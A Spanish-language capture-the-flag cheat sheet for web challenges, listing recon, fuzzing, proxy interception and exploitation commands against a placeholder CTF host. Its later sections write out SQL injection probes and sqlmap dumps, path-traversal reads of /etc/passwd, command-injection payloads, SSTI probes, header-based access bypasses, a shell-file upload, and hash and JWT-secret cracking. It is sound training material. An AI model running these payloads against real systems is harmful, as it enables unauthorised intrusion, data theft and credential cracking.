# Web

Trabaja por fases: reconocimiento, descubrimiento, intercepción y explotación. Siempre apunta los comandos contra el host del reto y guarda las requests interesantes.

## Checklist inicial

1. Abrir la web y revisar comportamiento normal.
2. Ver source, DevTools, cookies, localStorage, sessionStorage.
3. Identificar tecnologías.
4. Revisar `robots.txt`, `sitemap.xml`, rutas comunes y backups.
5. Interceptar requests con Burp/ZAP.
6. Automatizar solo cuando entiendas qué parámetro estás probando.

Variables útiles:

```bash
export URL="http://target.ctf"
export WL="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

## Reconocimiento

**Contexto:** entender que app es, que tecnologías usa y que datos quedan expuestos al cliente.

**Tools:** DevTools (F12), View Source, Wappalyzer, `curl`, `whatweb`, `httpx`.

**DevTools GUI:** revisar `Elements`, `Network`, `Application`, cookies, localStorage, sessionStorage, comentarios HTML, JS cargado y respuestas XHR/fetch.

**Wappalyzer GUI:** usar extensión para identificar framework, CMS, servidor, librerias JS, CDN y analytics.

**Ejemplos terminal:**

```bash
curl -i "$URL/"
curl -s "$URL/" | grep -Ei "flag|ctf|password|secret|todo|debug"
curl -s "$URL/robots.txt"
curl -s "$URL/sitemap.xml"
whatweb "$URL"
```

Headers interesantes:

```bash
curl -I "$URL/"
curl -s -D headers.txt -o /dev/null "$URL/"
cat headers.txt
```

Cookies y storage:

```bash
curl -i "$URL/login"
curl -b "session=VALOR" "$URL/profile"
```

## View source, JS y archivos del frontend

**Contexto:** muchas flags están en comentarios, JS, sourcemaps o endpoints hardcodeados.

**Tools:** browser source, DevTools, `curl`, `grep`, `rg`, `js-beautify`.

**Ejemplos:**

```bash
mkdir webdump
curl -s "$URL/" -o webdump/index.html
grep -Ei "flag|ctf|password|secret|api|token|debug|todo" webdump/index.html
grep -Eoi '<script[^>]+src="[^"]+"' webdump/index.html
```

Descargar y revisar JS:

```bash
curl -s "$URL/static/app.js" -o webdump/app.js
js-beautify webdump/app.js -o webdump/app.pretty.js
rg -i "flag|ctf|password|secret|token|api|admin|debug" webdump/
```

Sourcemaps:

```bash
curl -s "$URL/static/app.js.map" -o webdump/app.js.map
rg -i "flag|ctf|secret|source|webpack" webdump/app.js.map
```

## Descubrimiento de rutas y archivos

**Contexto:** encontrar directorios, archivos ocultos, backups, paneles admin y endpoints.

**Tools:** Gobuster, ffuf, `robots.txt` manual, SecLists.

**Gobuster básico:**

```bash
gobuster dir -u "$URL" -w "$WL"
gobuster dir -u "$URL" -w "$WL" -x php,html,txt,js,bak,old,zip
gobuster dir -u "$URL" -w "$WL" -s 200,204,301,302,307,401,403
```

Con cookie/header:

```bash
gobuster dir -u "$URL" -w "$WL" -H "Cookie: session=VALOR"
gobuster dir -u "$URL" -w "$WL" -H "Authorization: Bearer TOKEN"
```

**ffuf básico:**

```bash
ffuf -w "$WL" -u "$URL/FUZZ"
ffuf -w "$WL" -u "$URL/FUZZ" -e .php,.html,.txt,.bak,.old,.zip
```

Filtrar ruido por status, palabras o size:

```bash
ffuf -w "$WL" -u "$URL/FUZZ" -fc 404
ffuf -w "$WL" -u "$URL/FUZZ" -fs 1234
ffuf -w "$WL" -u "$URL/FUZZ" -fw 42
```

Fuzz de parámetros:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "$URL/search?FUZZ=test"
```

POST fuzz:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "$URL/login" \
  -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&FUZZ=test"
```

Virtual hosts:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u "$URL/" \
  -H "Host: FUZZ.target.ctf" \
  -fs 1234
```

## Robots manual

**Contexto:** `robots.txt` suele listar rutas "prohibidas" que en CTF son pistas directas.

**Tools:** navegador, `curl`, `grep`.

**Ejemplos:**

```bash
curl -s "$URL/robots.txt"
curl -s "$URL/robots.txt" | grep -Ei "disallow|allow|admin|backup|dev|flag"
```

Probar cada ruta:

```bash
for p in admin backup dev hidden; do curl -i "$URL/$p/"; done
```

## Intercepción

**Contexto:** necesitas ver/modificar requests, repetirlas, probar parámetros, cambiar cookies o inspeccionar respuestas.

**Tools:** Burp Suite Community, OWASP ZAP.

**Burp GUI:** configurar navegador con proxy `127.0.0.1:8080`, usar `Proxy -> Intercept`, enviar requests a `Repeater`, modificar parámetros/cookies/headers y comparar respuestas.

**ZAP GUI:** ZAP funciona como proxy manipulador. Puedes lanzar navegador desde ZAP o configurar proxy local `localhost:8080`; usa breakpoints/intercept para cambiar requests y responses.

**curl a través del proxy:**

```bash
curl -x http://127.0.0.1:8080 "$URL/" -k
curl -x http://127.0.0.1:8080 -i -b "session=VALOR" "$URL/profile" -k
```

Guardar request cruda para sqlmap u otros:

```text
GET /item?id=1 HTTP/1.1
Host: target.ctf
Cookie: session=VALOR
User-Agent: ctf
```

## curl para PoC manual

**Contexto:** reproducir una request sin navegador y modificar parámetros rápido.

**Tools:** `curl`, `jq`, `python3 -m json.tool`.

GET:

```bash
curl -i "$URL/item?id=1"
curl -s "$URL/api/user?id=1" | jq
```

POST form:

```bash
curl -i -X POST "$URL/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=admin"
```

POST JSON:

```bash
curl -i -X POST "$URL/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'
```

Cookies:

```bash
curl -i -b "session=VALOR" "$URL/profile"
curl -c cookies.txt -d "username=admin&password=admin" "$URL/login"
curl -b cookies.txt "$URL/profile"
```

Headers:

```bash
curl -i "$URL/admin" -H "X-Forwarded-For: 127.0.0.1"
curl -i "$URL/admin" -H "X-Original-URL: /admin"
curl -i "$URL/" -H "Host: admin.target.ctf"
```

Subida de archivo:

```bash
curl -i -X POST "$URL/upload" \
  -F "file=@shell.txt;type=text/plain" \
  -F "submit=Upload"
```

## Explotación: SQL injection

**Contexto:** parámetro numérico/string, login vulnerable, filtros débiles o errores SQL.

**Tools:** sqlmap, Burp Repeater, `curl`.

**Pruebas manuales suaves:**

```bash
curl -i "$URL/item?id=1'"
curl -i "$URL/item?id=1 OR 1=1"
curl -i "$URL/item?id=1 AND 1=2"
```

**sqlmap GET:**

```bash
sqlmap -u "$URL/item?id=1" --batch
sqlmap -u "$URL/item?id=1" --batch --dbs
sqlmap -u "$URL/item?id=1" --batch -D database_name --tables
sqlmap -u "$URL/item?id=1" --batch -D database_name -T users --dump
```

**sqlmap POST:**

```bash
sqlmap -u "$URL/login" \
  --data="username=admin&password=test" \
  --batch --dbs
```

**sqlmap con request de Burp:**

```bash
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -p id --risk 2 --level 3
```

Con cookie:

```bash
sqlmap -u "$URL/item?id=1" --cookie="session=VALOR" --batch --dbs
```

## Explotación: hash cracking web

**Contexto:** encuentras hash en DB dump, cookie firmada simple, backup o respuesta API.

**Tools:** hashcat, John, rockyou.

**Ejemplos:**

```bash
hashcat --identify hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat --show -m 0 hash.txt
```

John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

## Explotación: LFI/path traversal

**Contexto:** parámetros como `file=`, `page=`, `template=`, `lang=`.

**Tools:** `curl`, Burp Repeater, ffuf.

**Ejemplos:**

```bash
curl -i "$URL/view?file=../../../../etc/passwd"
curl -i "$URL/view?file=....//....//....//etc/passwd"
curl -i "$URL/view?file=/etc/passwd"
```

PHP wrappers comunes en CTF:

```bash
curl "$URL/view?file=php://filter/convert.base64-encode/resource=index.php" | base64 -d
curl "$URL/view?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d
```

## Explotación: command injection

**Contexto:** campos que hacen ping, nslookup, conversores, diagnósticos o llamadas shell.

**Tools:** Burp Repeater, `curl`.

**Ejemplos en lab/CTF:**

```bash
curl -i "$URL/ping?host=127.0.0.1;id"
curl -i "$URL/ping?host=127.0.0.1%26%26id"
curl -i "$URL/ping?host=127.0.0.1|whoami"
```

Buscar flag:

```bash
curl "$URL/ping?host=127.0.0.1;ls"
curl "$URL/ping?host=127.0.0.1;cat%20flag.txt"
```

## Explotación: SSTI

**Contexto:** template engines como Jinja2, Twig, Handlebars, ERB.

**Tools:** Burp, `curl`.

**Detección:**

```bash
curl "$URL/?name={{7*7}}"
curl "$URL/?name=${7*7}"
curl "$URL/?name=<%= 7*7 %>"
```

Si devuelve `49`, identifica motor antes de avanzar.

## Explotación: JWT

**Contexto:** cookies o headers `Authorization: Bearer <token>` con JWT.

**Tools:** jwt.io, CyberChef, `jq`, hashcat en casos de secreto débil.

**Inspección sin verificar firma:**

```bash
TOKEN="eyJ..."
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null | jq
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq
```

Probar secreto débil HS256:

```bash
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
```

## Orden recomendado en competencia

1. `curl -i`, source y DevTools.
2. `robots.txt`, `sitemap.xml`, JS y sourcemaps.
3. Gobuster/ffuf con extensiones.
4. Burp/ZAP para requests importantes.
5. sqlmap solo contra parámetros con pinta de SQLi.
6. curl para PoC final reproducible.
